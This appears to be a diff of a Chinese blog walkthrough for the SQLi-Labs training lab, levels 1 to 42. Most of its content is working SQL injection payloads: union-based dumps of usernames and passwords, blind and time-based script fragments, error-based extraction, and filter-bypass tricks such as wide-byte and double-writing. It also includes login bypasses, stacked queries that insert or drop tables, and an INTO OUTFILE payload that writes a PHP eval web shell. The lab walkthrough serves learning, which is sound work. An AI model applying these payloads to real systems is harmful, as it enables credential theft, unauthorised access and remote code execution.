@@ -166,21 +166,21 @@
       <div class="py-5 z-depth-3" id="board">
         <div class="post-content mx-auto" id="post">
           <div class="markdown-body">
-            <h4><span id="less-1">Less-1</span></h4><p><code>?id=1&#39;</code> 单引号报错，存在注入</p>
+            <h4 id="Less-1"><a href="#Less-1" class="headerlink" title="Less-1"></a>Less-1</h4><p><code>?id=1&#39;</code> 单引号报错，存在注入</p>
 <p><code>?id=1&#39; order by 4 %23&#39;</code>报错，存在三列</p>
 <p><code>?id=-1&#39; union select 1,2,3%23</code> 发现2和3的位置可以回显，于是进行注入</p>
 <p><code>?id=-1&#39; union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=database()),3 %23</code><br>得到当前库下所有表名</p>
 <p><code>?id=-1&#39; union select 1,(select group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39;),3%23</code><br>得到users表下的所有列名</p>
 <p><code>?id=-1&#39; union select 1,(select group_concat(username) from users),(select group_concat(password) from users)%23</code><br>得到所有的username和password<br><img src="/2019/07/26/SQLi-Labs通关笔记/20190716215108803.png" srcset="/img/loading.gif" alt="在这里插入图片描述"></p>
-<h4><span id="less-2">Less-2</span></h4><p>less-1用单引号闭合了，而这里的id是整型，其他的注入方法与less-1相同。</p>
+<h4 id="Less-2"><a href="#Less-2" class="headerlink" title="Less-2"></a>Less-2</h4><p>less-1用单引号闭合了，而这里的id是整型，其他的注入方法与less-1相同。</p>
 <p>最终payload：<br><code>?id=-1 union select 1,(select group_concat(username) from users),(select group_concat(password) from users)%23</code></p>
 <p><br></p>
-<h4><span id="less-3">Less-3</span></h4><p>区别是这里用<code>&#39;)</code>进行闭合</p>
+<h4 id="Less-3"><a href="#Less-3" class="headerlink" title="Less-3"></a>Less-3</h4><p>区别是这里用<code>&#39;)</code>进行闭合</p>
 <p>最终payload：<br><code>?id=-1&#39;) union select 1,(select group_concat(username) from users),(select group_concat(password) from users)%23</code><br><br></p>
-<h4><span id="less-4">Less-4</span></h4><p>区别是这里用<code>&quot;)</code>进行闭合</p>
+<h4 id="Less-4"><a href="#Less-4" class="headerlink" title="Less-4"></a>Less-4</h4><p>区别是这里用<code>&quot;)</code>进行闭合</p>
 <p>最终payload：<br><code>?id=-1&quot;) union select 1,(select group_concat(username) from users),(select group_concat(password) from users)%23</code></p>
 <p><br></p>
-<h4><span id="less-5">Less-5</span></h4><p>发现有回显”You are in………..”和不回显两种情况</p>
+<h4 id="Less-5"><a href="#Less-5" class="headerlink" title="Less-5"></a>Less-5</h4><p>发现有回显”You are in………..”和不回显两种情况</p>
 <pre><code>?id=1&#39; and 1=1%23   You are in...........
 ?id=1&#39; and 1=2%23  不回显
 </code></pre><p>判断为盲注，这里可以直接用sqlmap跑出来，但为了学习，还是自己写个脚本吧！</p>
@@ -205,15 +205,15 @@ for i in range(50):
     print(data)
 </code></pre>
 <p><br></p>
-<h4><span id="less-6">Less-6</span></h4><p>同样是bool盲注，双引号报错，判断为双引号闭合，将less-5的脚本中payload的单引号改为双引号即可。<br><br></p>
-<h4><span id="less-7">Less-7</span></h4><p>测试发现<code>id=1&#39;</code>报错，但把后面的语句注释掉扔报错，还有括号闭合，发现加两个括号判断为<code>((&#39;$id&#39;))</code>闭合。<br>根据提示Use outfile……，应该是具有导出什么的了。</p>
+<h4 id="Less-6"><a href="#Less-6" class="headerlink" title="Less-6"></a>Less-6</h4><p>同样是bool盲注，双引号报错，判断为双引号闭合，将less-5的脚本中payload的单引号改为双引号即可。<br><br></p>
+<h4 id="Less-7"><a href="#Less-7" class="headerlink" title="Less-7"></a>Less-7</h4><p>测试发现<code>id=1&#39;</code>报错，但把后面的语句注释掉扔报错，还有括号闭合，发现加两个括号判断为<code>((&#39;$id&#39;))</code>闭合。<br>根据提示Use outfile……，应该是具有导出什么的了。</p>
 <p>（1）首先判断是否有权限：<br><code>?id=1&#39;)) and (select count(*) from mysql.user)&gt;0--+</code><br>没有报错，具有root权限。<br>（2）于是将数据导出：<br><code>?id=-1&#39;)) union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema=database()) into outfile &quot;E:\\CTF\\less-7\\table.txt&quot;--+</code><br>导出所有表</p>
 <p><code>?id=-1&#39;)) union select 1,2,(select group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39;) into outfile &quot;E:\\CTF\\less-7\\column.txt&quot;--+</code><br>导出user表中所有列名</p>
 <p><code>?id=-1&#39;)) union select 1,2,(select group_concat(username,password) from users) into outfile &quot;E:\\CTF\\less-7\\data.txt&quot;--+</code><br>导出用户名和密码</p>
 <p>注意：在Mysql中，需要注意路径转义的问题，即用<code>\\</code>分隔。</p>
 <p>另一种也可以向根目录下写入一句话木马，再用菜刀连接：<br><code>?id=-1&#39;)) union select 1,2,&#39;&lt;?php eval($_POST[&quot;cmd&quot;]);?&gt;&#39; into outfile &quot;D:\\PHPWAMP_IN3\\wwwroot\\sqli-labs-master\\Less-7\\shell.php&quot;--+</code><br><img src="/2019/07/26/SQLi-Labs通关笔记/2019071720415417.png" srcset="/img/loading.gif" alt="在这里插入图片描述"><br><br></p>
-<h4><span id="less-8">Less-8</span></h4><p>单引号闭合的盲注，用less-5的脚本跑一下即可。<br><br></p>
-<h4><span id="less-9">Less-9</span></h4><p>发现页面无论对错都只回显<code>You are in...........</code></p>
+<h4 id="Less-8"><a href="#Less-8" class="headerlink" title="Less-8"></a>Less-8</h4><p>单引号闭合的盲注，用less-5的脚本跑一下即可。<br><br></p>
+<h4 id="Less-9"><a href="#Less-9" class="headerlink" title="Less-9"></a>Less-9</h4><p>发现页面无论对错都只回显<code>You are in...........</code></p>
 <p>测试<code>?id=1&#39; and sleep(3)%23</code> 页面会延时3秒再回显，判断为时间盲注</p>
 <p>脚本如下：</p>
 <pre><code class="python"># less-9 time-base script
@@ -240,7 +240,7 @@ for i in range(50):
             break       
 </code></pre>
 <p><br></p>
-<h4><span id="less-10">Less-10</span></h4><p>双引号闭合的时间盲注。</p>
+<h4 id="Less-10"><a href="#Less-10" class="headerlink" title="Less-10"></a>Less-10</h4><p>双引号闭合的时间盲注。</p>
 <p>稍微改一下less-9的脚本即可：</p>
 <pre><code class="python"># less-10 script
 # auther：Lethe
@@ -266,18 +266,18 @@ for i in range(50):
             break            
 </code></pre>
 <p><br></p>
-<h4><span id="less-11">Less-11</span></h4><p>是一个登录框，后端语句为:</p>
+<h4 id="Less-11"><a href="#Less-11" class="headerlink" title="Less-11"></a>Less-11</h4><p>是一个登录框，后端语句为:</p>
 <pre><code class="php">@$sql=&quot;SELECT username, password FROM users WHERE username=&#39;$uname&#39; and password=&#39;$passwd&#39; LIMIT 0,1&quot;;
 </code></pre>
 <p>所有构造万能密码即可：<br>即Username为<code>1&#39; or 1=1#</code>，Password为任意值。</p>
 <p>因为这里是Post方式传到后端，因此注释符只能用<code>#</code><br><br></p>
-<h4><span id="less-12">Less-12</span></h4><p>与上题的区别是这里用<code>(&quot;$uname&quot;)</code>进行闭合</p>
+<h4 id="Less-12"><a href="#Less-12" class="headerlink" title="Less-12"></a>Less-12</h4><p>与上题的区别是这里用<code>(&quot;$uname&quot;)</code>进行闭合</p>
 <p>因此构造Username为<code>1&quot;) or 1=1#</code><br><br></p>
-<h4><span id="less-13">Less-13</span></h4><p>闭合方式为：<code>(&#39;$uname&#39;)</code></p>
+<h4 id="Less-13"><a href="#Less-13" class="headerlink" title="Less-13"></a>Less-13</h4><p>闭合方式为：<code>(&#39;$uname&#39;)</code></p>
 <p>因此构造Username为<code>1&#39;) or 1=1#</code><br><br></p>
-<h4><span id="less-14">Less-14</span></h4><p>闭合方式为：<code>&quot;$uname&quot;</code></p>
+<h4 id="Less-14"><a href="#Less-14" class="headerlink" title="Less-14"></a>Less-14</h4><p>闭合方式为：<code>&quot;$uname&quot;</code></p>
 <p>因此构造Username为<code>1&quot; or 1=1#</code><br><br></p>
-<h4><span id="less-15">Less-15</span></h4><p>字符型POST盲注</p>
+<h4 id="Less-15"><a href="#Less-15" class="headerlink" title="Less-15"></a>Less-15</h4><p>字符型POST盲注</p>
 <p>构造<code>1&#39; or 1=1#</code>即可登陆</p>
 <p>要想通过这个注入出数据，可以写个脚本，但这里回显的语句是图片，不好进行bool盲注，于是考虑时间盲注。</p>
 <p>发现构造：<code>1&#39; or sleep(3)#</code>页面会进行延时，所以脚本如下：</p>
@@ -305,9 +305,9 @@ for i in range(50):
             break
 </code></pre>
 <p><br></p>
-<h4><span id="less-16">Less-16</span></h4><p>将less-15中的闭合方式改为<code>(&quot;$uname&quot;)</code>即可，其他都一样。</p>
+<h4 id="Less-16"><a href="#Less-16" class="headerlink" title="Less-16"></a>Less-16</h4><p>将less-15中的闭合方式改为<code>(&quot;$uname&quot;)</code>即可，其他都一样。</p>
 <p><br></p>
-<h4><span id="less-17">Less-17</span></h4><pre><code class="php">function check_input($value)
+<h4 id="Less-17"><a href="#Less-17" class="headerlink" title="Less-17"></a>Less-17</h4><pre><code class="php">function check_input($value)
     {
     if(!empty($value))
         {
@@ -384,27 +384,27 @@ New Password : 1&#39; and extractvalue(1,concat(0x7e,( select * from ( select gr
 发现报错的信息字数有限，因此想要获得全部数据的化可以通过limit语句一条条的读:
 1&#39; and extractvalue(1,concat(0x7e,( select * from ( select concat_ws(&#39;:&#39;,username,password) from users limit 0,1)a),0x7e))#
 </code></pre><p><br></p>
-<h4><span id="less-18">Less-18</span></h4><p>进入页面发现会显示<code>Your IP ADDRESS is: xxx.xxx.xxx.xxx</code>，再根据名字判断应该是HTTP首部注入，注入的字段可能是X-Forward-For之类的地方，但登陆后会回显User-Agent的内容，这里是通过User-Agent进行注入。</p>
+<h4 id="Less-18"><a href="#Less-18" class="headerlink" title="Less-18"></a>Less-18</h4><p>进入页面发现会显示<code>Your IP ADDRESS is: xxx.xxx.xxx.xxx</code>，再根据名字判断应该是HTTP首部注入，注入的字段可能是X-Forward-For之类的地方，但登陆后会回显User-Agent的内容，这里是通过User-Agent进行注入。</p>
 <p>同样是报错注入：<br>先尝试：<br><img src="/2019/07/26/SQLi-Labs通关笔记/20190721000838862.png" srcset="/img/loading.gif" alt="在这里插入图片描述"><br>由报错信息可以推测后台Insert语句<code>····VALUES (&#39;$uagent&#39;, &#39;$IP&#39;, $uname)</code></p>
 <p>因此构造payload：<br><code>1&#39; and extractvalue(1,concat(0x7e,(select database()),0x7e)),&#39;&#39;,&#39;&#39;)#</code><br><img src="/2019/07/26/SQLi-Labs通关笔记/20190720235005723.png" srcset="/img/loading.gif" alt="在这里插入图片描述"><br>最终payload:(通过改变limit语句逐条注出数据)<br><code>1&#39; and extractvalue(1,concat(0x7e,( select * from ( select concat_ws(&#39;:&#39;,username,password) from users limit 0,1)a),0x7e)),&#39;&#39;,&#39;&#39;)#</code><br><img src="/2019/07/26/SQLi-Labs通关笔记/20190720235138536.png" srcset="/img/loading.gif" alt="在这里插入图片描述"></p>
 <p><br></p>
-<h4><span id="less-19">Less-19</span></h4><p>同样登陆后回显Referer的内容，应该是通过http首部的Referer字段进行注入。</p>
+<h4 id="Less-19"><a href="#Less-19" class="headerlink" title="Less-19"></a>Less-19</h4><p>同样登陆后回显Referer的内容，应该是通过http首部的Referer字段进行注入。</p>
 <p>先判断后台Insert语句：<br><img src="/2019/07/26/SQLi-Labs通关笔记/20190721000622353.png" srcset="/img/loading.gif" alt="在这里插入图片描述">大致为：<code>···VALUES (&#39;$uagent&#39;, &#39;$IP&#39;)</code></p>
 <p>于是payload:<br><code>1&#39; and updatexml(1,concat(0x7e,(select * from ( select concat_ws(&#39;:&#39;,username,password) from users limit 0,1)a),0x7e),1),&#39;&#39;)#</code><br><br></p>
-<h4><span id="less-20">Less-20</span></h4><p>同样是http首部注入，这里是通过Cookie注入，大体流程和前面差不多。</p>
+<h4 id="Less-20"><a href="#Less-20" class="headerlink" title="Less-20"></a>Less-20</h4><p>同样是http首部注入，这里是通过Cookie注入，大体流程和前面差不多。</p>
 <p>payload:<br><code>uname=1&#39; and updatexml(1,concat(0x7e,(select * from ( select concat_ws(&#39;:&#39;,username,password) from users limit 0,1)a),0x7e),1)#</code></p>
 <p>设置Cookie的值为此即可<br><img src="/2019/07/26/SQLi-Labs通关笔记/20190721002907147.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTgxNDI4,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" alt="在这里插入图片描述"><br><br></p>
-<h4><span id="less-21">Less-21</span></h4><p>这一关和less-20的区别就是对Cookie的uname进行了一下base64的编码，同时用<code>(&#39;&#39;)</code>进行的闭合。</p>
+<h4 id="Less-21"><a href="#Less-21" class="headerlink" title="Less-21"></a>Less-21</h4><p>这一关和less-20的区别就是对Cookie的uname进行了一下base64的编码，同时用<code>(&#39;&#39;)</code>进行的闭合。</p>
 <p>所以payload：<br><code>uname=1&#39;) and updatexml(1,concat(0x7e,(select * from ( select concat_ws(&#39;:&#39;,username,password) from users limit 0,1)a),0x7e),1)#</code></p>
 <p>base64一下得到:<br><code>uname=MScpIGFuZCB1cGRhdGV4bWwoMSxjb25jYXQoMHg3ZSwoc2VsZWN0ICogZnJvbSAoIHNlbGVjdCBjb25jYXRfd3MoJzonLHVzZXJuYW1lLHBhc3N3b3JkKSBmcm9tIHVzZXJzIGxpbWl0IDAsMSlhKSwweDdlKSwxKSM=</code><br>将Cookie设为base64后的payload<br><img src="/2019/07/26/SQLi-Labs通关笔记/20190721004327173.png" srcset="/img/loading.gif" alt="在这里插入图片描述"><br><br></p>
-<h4><span id="less-22">Less-22</span></h4><p>与less-21的区别是这里用了<code>&quot;</code>进行闭合，其他都一样。</p>
+<h4 id="Less-22"><a href="#Less-22" class="headerlink" title="Less-22"></a>Less-22</h4><p>与less-21的区别是这里用了<code>&quot;</code>进行闭合，其他都一样。</p>
 <p>payload:<br><code>uname=MSIgYW5kIHVwZGF0ZXhtbCgxLGNvbmNhdCgweDdlLChzZWxlY3QgKiBmcm9tICggc2VsZWN0IGNvbmNhdF93cygnOicsdXNlcm5hbWUscGFzc3dvcmQpIGZyb20gdXNlcnMgbGltaXQgMCwxKWEpLDB4N2UpLDEpIw==</code></p>
 <p><br></p>
-<h4><span id="less-23">Less-23</span></h4><p>单引号闭合且过滤了注释符<code>#</code>和<code>--</code></p>
+<h4 id="Less-23"><a href="#Less-23" class="headerlink" title="Less-23"></a>Less-23</h4><p>单引号闭合且过滤了注释符<code>#</code>和<code>--</code></p>
 <p>因此使用union注入时，要构造sql语句闭合前后的单引号。</p>
 <p>payload:（注意最后有个单引号用来闭合）<br><code>?id=-1&#39; union select 1,(select group_concat(username) from users),(select group_concat(password) from users)&#39;</code></p>
 <p><br></p>
-<h4><span id="less-24">Less-24</span></h4><p>根据名字，是一道二次注入的题目，二次注入的题一般都要通过代码审计找出可控点，否则很难注入。</p>
+<h4 id="Less-24"><a href="#Less-24" class="headerlink" title="Less-24"></a>Less-24</h4><p>根据名字，是一道二次注入的题目，二次注入的题一般都要通过代码审计找出可控点，否则很难注入。</p>
 <p>那就进行代码审计，整个代码逻辑比较简单：注册 =&gt; 登陆（登陆时login.php会设置Session）=&gt; 登陆后可以修改密码</p>
 <p>重点关注一下操作数据库的部分，发现只有一个地方的变量在拼接到sql语句中时没有用<code>mysql_real_escape_string()</code>函数进行过滤，在pass_change.php中。</p>
 <pre><code class="php">if (isset($_POST[&#39;submit&#39;]))
@@ -475,7 +475,7 @@ if (!$login== 0)
 <p>这样在修改密码时，拼接过后的Update语句就为：<br><code>UPDATE users SET PASSWORD=&#39;$pass&#39; where username=&#39; admin&#39;# &#39; and password=&#39;$curr_pass&#39;</code></p>
 <p>也就可以修改admin用户的密码了。</p>
 <p><br></p>
-<h4><span id="less-25">Less-25</span></h4><p>单引号闭合，过滤了<code>or</code>、<code>and</code>、<code>&amp;&amp;</code>：</p>
+<h4 id="Less-25"><a href="#Less-25" class="headerlink" title="Less-25"></a>Less-25</h4><p>单引号闭合，过滤了<code>or</code>、<code>and</code>、<code>&amp;&amp;</code>：</p>
 <pre><code class="php">function blacklist($id)
 {
     $id= preg_replace(&#39;/or/i&#39;,&quot;&quot;, $id);            //strip out OR (non case sensitive)
@@ -488,26 +488,26 @@ if (!$login== 0)
 <p>payload:（注意<code>information</code>和<code>password</code>里也有<code>or</code>，需要双写）</p>
 <p><code>?id=-1&#39; union select 1,(select group_concat(column_name) from infoorrmation_schema.columns where table_name=&#39;users&#39;),3--+</code></p>
 <p><code>?id=-1&#39; union select 1,(select group_concat(username) from users),(select group_concat(passwoorrd) from users)--+</code><br><br></p>
-<h4><span id="less-25a">Less-25a</span></h4><p>过滤和绕过方式同less-25，区别是不需要单引号闭合了。</p>
+<h4 id="Less-25a"><a href="#Less-25a" class="headerlink" title="Less-25a"></a>Less-25a</h4><p>过滤和绕过方式同less-25，区别是不需要单引号闭合了。</p>
 <p>payload:<br><code>?id=-1 union select 1,(select group_concat(username) from users),(select group_concat(passwoorrd) from users)--+</code><br><br></p>
-<h4><span id="less-26">Less-26</span></h4><p>过滤了<code>or,and,-,#,&amp;&amp;,空格、内联注释符(/**/)</code></p>
+<h4 id="Less-26"><a href="#Less-26" class="headerlink" title="Less-26"></a>Less-26</h4><p>过滤了<code>or,and,-,#,&amp;&amp;,空格、内联注释符(/**/)</code></p>
 <ul>
 <li>本来<code>/**/</code>可以用来绕过空格，但这里被过滤了，所以用<code>%a0</code>绕过</li>
 <li><code>or</code>和<code>and</code>依旧用双写绕过，</li>
 <li>所有注释符都被过滤了，所以考虑闭合单引号而不是注释</li>
 </ul>
 <p>payload:<br><code>?id=0&#39;%a0union%a0select%a01,(select%a0group_concat(passwoorrd)%a0from%a0users),&#39;3</code><br><br></p>
-<h4><span id="less-26a">Less-26a</span></h4><p>和上题一样，只不过是用<code>(&#39;$id&#39;)闭合</code></p>
+<h4 id="Less-26a"><a href="#Less-26a" class="headerlink" title="Less-26a"></a>Less-26a</h4><p>和上题一样，只不过是用<code>(&#39;$id&#39;)闭合</code></p>
 <p>payload:<br><code>?id=0&#39;)%a0union%a0select%a01,(select%a0group_concat(passwoorrd)%a0from%a0users),(&#39;3</code><br><br></p>
-<h4><span id="less-27">Less-27</span></h4><p>在前面的基础上，少过滤了<code>or</code>和<code>and</code>，多过滤了<code>union或UNION</code>和<code>select或UNION</code>,这里<code>union</code>可以用双写或大小写绕过，而<code>select</code>只能用大小写绕过，应该是过滤时使用了全局匹配。</p>
+<h4 id="Less-27"><a href="#Less-27" class="headerlink" title="Less-27"></a>Less-27</h4><p>在前面的基础上，少过滤了<code>or</code>和<code>and</code>，多过滤了<code>union或UNION</code>和<code>select或UNION</code>,这里<code>union</code>可以用双写或大小写绕过，而<code>select</code>只能用大小写绕过，应该是过滤时使用了全局匹配。</p>
 <p>payload:<br><code>?id=0&#39;%a0uNIon%a0seLEct%a01,(seLEct%a0group_concat(password)%a0from%a0users),&#39;3</code><br><br></p>
-<h4><span id="less-27a">Less-27a</span></h4><p>双引号闭合，其他和less-27一样。</p>
+<h4 id="Less-27a"><a href="#Less-27a" class="headerlink" title="Less-27a"></a>Less-27a</h4><p>双引号闭合，其他和less-27一样。</p>
 <p><code>?id=0&quot;%a0uNIon%a0seLEct%a01,(seLEct%a0group_concat(password)%a0from%a0users),&quot;3</code><br><br></p>
-<h4><span id="less-28">Less-28</span></h4><p><code>(&#39;$id&#39;)</code>闭合，其他和less-27一样。</p>
+<h4 id="Less-28"><a href="#Less-28" class="headerlink" title="Less-28"></a>Less-28</h4><p><code>(&#39;$id&#39;)</code>闭合，其他和less-27一样。</p>
 <p>payload:<br><code>?id=0&#39;)%a0uNIon%a0seLEct%a01,(seLEct%a0group_concat(password)%a0from%a0users),(&#39;3</code><br><br></p>
-<h4><span id="less-28a">Less-28a</span></h4><p>和less-28一模一样…</p>
+<h4 id="Less-28a"><a href="#Less-28a" class="headerlink" title="Less-28a"></a>Less-28a</h4><p>和less-28一模一样…</p>
 <p>payload:<br><code>?id=0&#39;)%a0uNIon%a0seLEct%a01,(seLEct%a0group_concat(password)%a0from%a0users),(&#39;3</code><br><br></p>
-<h4><span id="less-29">Less-29</span></h4><p>Less 29 - Less 31这三关实际上是两层服务器架构，在做这三关之前需要把 Tomcat 为引擎的 jsp 服务器搭好。<br>参考：<a href="https://www.cnblogs.com/lcamry/p/5762961.html" target="_blank" rel="noopener">MySQL注入天书</a></p>
+<h4 id="Less-29"><a href="#Less-29" class="headerlink" title="Less-29"></a>Less-29</h4><p>Less 29 - Less 31这三关实际上是两层服务器架构，在做这三关之前需要把 Tomcat 为引擎的 jsp 服务器搭好。<br>参考：<a href="https://www.cnblogs.com/lcamry/p/5762961.html" target="_blank" rel="noopener">MySQL注入天书</a></p>
 <p>重点：对于<code>index.php?id=1&amp;id=2</code>该如何解析呢？实际上apache（php）解析最后一个参数，即显示id=2的内容，而Tomcat（jsp）解析第一个参数，即显示id=1的内容</p>
 <p>整个逻辑大概就是，获取url中查询的部分，第一个<code>id</code>的值经过<code>java_implimentation()</code>处理看是否符合<code>whitelist()</code>函数的过滤要求，若不符合就检测出攻击，否则就把第二个<code>id</code>的值拼接到sql语句中进行查询。</p>
 <p>那我们分别看看这两个函数：</p>
@@ -518,70 +518,70 @@ if (!$login== 0)
 </li>
 </ul>
 <p>因此构造payload：<br><code>?id=123&amp;id=-1&#39; union select 1,(select group_concat(username) from users),(select group_concat(password) from users)--+</code><br><br></p>
-<h4><span id="less-30">Less-30</span></h4><p>同上，不过是双引号闭合。</p>
+<h4 id="Less-30"><a href="#Less-30" class="headerlink" title="Less-30"></a>Less-30</h4><p>同上，不过是双引号闭合。</p>
 <p>payload:<br><code>?id=123&amp;id=-1&quot; union select 1,(select group_concat(username) from users),(select group_concat(password) from users)--+</code><br><br></p>
-<h4><span id="less-31">Less-31</span></h4><p>同上，不过是<code>(&quot;$id&quot;)</code>闭合。</p>
+<h4 id="Less-31"><a href="#Less-31" class="headerlink" title="Less-31"></a>Less-31</h4><p>同上，不过是<code>(&quot;$id&quot;)</code>闭合。</p>
 <p>payload:<br><code>?id=123&amp;id=-1&quot;) union select 1,(select group_concat(username) from users),(select group_concat(password) from users)--+</code><br><br></p>
-<h4><span id="less-32">Less-32</span></h4><p>这一关将payload中的单引号前面加上了<code>\</code>进行过滤，想到宽字节注入，即利用gbk编码<code>%df</code>+<code>%5c(\)</code> 组合出了一个 <code>運</code> 字。</p>
+<h4 id="Less-32"><a href="#Less-32" class="headerlink" title="Less-32"></a>Less-32</h4><p>这一关将payload中的单引号前面加上了<code>\</code>进行过滤，想到宽字节注入，即利用gbk编码<code>%df</code>+<code>%5c(\)</code> 组合出了一个 <code>運</code> 字。</p>
 <p>注意，这里除了闭合的时候需要考虑绕过单引号，在注入出列名的时候，也需要用到单引号，但这里就不能用<code>%df</code>绕过了，如下面payload中的表名<code>users</code>：</p>
 <p><code>?id=-1 union select 1,(select group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39;),3--+</code></p>
 <p>这里可以用16进制绕过，即用<code>user</code>的16进制<code>0x7573657273</code>代替它，表名为16进制时不需要再用引号了。</p>
 <p>payload:<br><code>?id=-1%df&#39; union select 1,(select group_concat(column_name) from information_schema.columns where table_name=0x7573657273),3--+</code></p>
 <p><code>?id=-1%df&#39; union select 1,(select group_concat(username) from users),(select group_concat(password) from users)--+</code></p>
 <p><br></p>
-<h4><span id="less-33">Less-33</span></h4><p>与less-32一样…</p>
+<h4 id="Less-33"><a href="#Less-33" class="headerlink" title="Less-33"></a>Less-33</h4><p>与less-32一样…</p>
 <p>payload:<br><code>?id=-1%df&#39; union select 1,(select group_concat(username) from users),(select group_concat(password) from users)--+</code><br><br></p>
-<h4><span id="less-34">Less-34</span></h4><p>这关的过滤方式和前面一样，考虑宽字节注入，但是POST传入数据时不会进行URL编码，因此这里采用将utf8单引号转为utf-16/utf-32编码绕过，即将<code>&#39;</code>转为utf-16为 <code>�&#39;</code></p>
+<h4 id="Less-34"><a href="#Less-34" class="headerlink" title="Less-34"></a>Less-34</h4><p>这关的过滤方式和前面一样，考虑宽字节注入，但是POST传入数据时不会进行URL编码，因此这里采用将utf8单引号转为utf-16/utf-32编码绕过，即将<code>&#39;</code>转为utf-16为 <code>�&#39;</code></p>
 <p>payload:</p>
 <pre><code>万能密码：
 Username: 1�&#39; or 1=1#
 Password: 任意
 </code></pre><p><br></p>
-<h4><span id="less-35">Less-35</span></h4><p>GET型宽字解注入，但区别是这里是数字型，不需要用单引号闭合了，其他的和less-32一样，16进制绕过一下表名即可。</p>
+<h4 id="Less-35"><a href="#Less-35" class="headerlink" title="Less-35"></a>Less-35</h4><p>GET型宽字解注入，但区别是这里是数字型，不需要用单引号闭合了，其他的和less-32一样，16进制绕过一下表名即可。</p>
 <p>payload:<br><code>?id=-1 union select 1,(select group_concat(username) from users),(select group_concat(password) from users)--+</code><br><br></p>
-<h4><span id="less-36">Less-36</span></h4><p>好像和less-32一样..</p>
+<h4 id="Less-36"><a href="#Less-36" class="headerlink" title="Less-36"></a>Less-36</h4><p>好像和less-32一样..</p>
 <p>payload:<br><code>?id=-1%df&#39; union select 1,(select group_concat(username) from users),(select group_concat(password) from users)--+</code></p>
 <p><br></p>
-<h4><span id="less-37">Less-37</span></h4><p>好像和less-34一样…</p>
+<h4 id="Less-37"><a href="#Less-37" class="headerlink" title="Less-37"></a>Less-37</h4><p>好像和less-34一样…</p>
 <p>payload:</p>
 <pre><code>万能密码：
 Username: 1�&#39; or 1=1#
 Password: 任意
 </code></pre><p><br></p>
-<h4><span id="less-38">Less-38</span></h4><p>堆叠注入，可以执行多条语句，用分号间隔，可参考：<a href="https://www.cnblogs.com/lcamry/p/5762905.html" target="_blank" rel="noopener">https://www.cnblogs.com/lcamry/p/5762905.html</a></p>
+<h4 id="Less-38"><a href="#Less-38" class="headerlink" title="Less-38"></a>Less-38</h4><p>堆叠注入，可以执行多条语句，用分号间隔，可参考：<a href="https://www.cnblogs.com/lcamry/p/5762905.html" target="_blank" rel="noopener">https://www.cnblogs.com/lcamry/p/5762905.html</a></p>
 <p>堆叠注入优点是可以执行的语句更加灵活，如Create、Delete、Update、Insert、Drop….，但代码通常只返回一个查询结果，因此，堆叠注入第二个语句产生错误或者结果只能被忽略，我们在前端界面是无法看到返回结果的。</p>
 <p>如执行如下payload：<br><code>?id=1&#39;;create table Lethe like users--+</code><br>执行完后页面没有变，但是查询表时可以发现多出了<code>lethe</code>表：<br><img src="/2019/07/26/SQLi-Labs通关笔记/20190724211633834.png" srcset="/img/loading.gif" alt="在这里插入图片描述"></p>
 <p>再将这个表删除：<code>?id=1&#39;;drop table Lethe--+</code><br><img src="/2019/07/26/SQLi-Labs通关笔记/20190724211832450.png" srcset="/img/loading.gif" alt="在这里插入图片描述"><br>发现<code>Lethe</code>表已被删除。</p>
 <p>同样，我也可以在它的<code>user</code>表中插入我们自己的一条信息：<br><code>?id=1&#39;;insert into users(id,username,password) values(&#39;20&#39;,&#39;Lethe&#39;,&#39;Lethe&#39;)--+</code><br><br></p>
-<h4><span id="less-39">Less-39</span></h4><p>和less-38一样，只不过这里是数字型，无需闭合。</p>
+<h4 id="Less-39"><a href="#Less-39" class="headerlink" title="Less-39"></a>Less-39</h4><p>和less-38一样，只不过这里是数字型，无需闭合。</p>
 <p><code>?id=1;insert into users(id,username,password) values(&#39;20&#39;,&#39;Lethe&#39;,&#39;Lethe&#39;)--+</code><br><br></p>
-<h4><span id="less-40">Less-40</span></h4><p>和前面两关的区别是这里用<code>(&#39;$id&#39;)</code>闭合</p>
+<h4 id="Less-40"><a href="#Less-40" class="headerlink" title="Less-40"></a>Less-40</h4><p>和前面两关的区别是这里用<code>(&#39;$id&#39;)</code>闭合</p>
 <p><code>?id=1&#39;);insert into users(id,username,password) values(&#39;20&#39;,&#39;Lethe&#39;,&#39;Lethe&#39;)--+</code><br><br></p>
-<h4><span id="less-41">Less-41</span></h4><p>和less-39一样，<code>?id=1</code>和<code>?id=2-1</code>返回相同结果，数字型注入。</p>
+<h4 id="Less-41"><a href="#Less-41" class="headerlink" title="Less-41"></a>Less-41</h4><p>和less-39一样，<code>?id=1</code>和<code>?id=2-1</code>返回相同结果，数字型注入。</p>
 <p><code>?id=1;insert into users(id,username,password) values(&#39;20&#39;,&#39;Lethe&#39;,&#39;Lethe&#39;)--+</code><br><br></p>
-<h4><span id="less-42">Less-42</span></h4><p>进入页面是一个登陆窗口，发现注册不了，提示要我们<code>hack</code>掉它，根据前面，判断应该是用堆叠注入插入一个用户到数据库中，来进行登陆。</p>
+<h4 id="Less-42"><a href="#Less-42" class="headerlink" title="Less-42"></a>Less-42</h4><p>进入页面是一个登陆窗口，发现注册不了，提示要我们<code>hack</code>掉它，根据前面，判断应该是用堆叠注入插入一个用户到数据库中，来进行登陆。</p>
 <p>但这里对Usernmae进行了过滤，因此利用Password来进行堆叠注入。</p>
 <p>payload:</p>
 <pre><code>Username：任意
 Password：1&#39;;insert into users(id,username,password) values(&#39;20&#39;,&#39;Lethe&#39;,&#39;Lethe&#39;)#
 </code></pre><p>先利用payload尝试登陆，虽然显示登陆失败，但实际上堆叠注入的语句已经执行，然后再用账户密码均为<code>Lethe</code>的账户进行登陆，发现可以登陆成功。<br><img src="/2019/07/26/SQLi-Labs通关笔记/20190724215904736.png" srcset="/img/loading.gif" alt="在这里插入图片描述"></p>
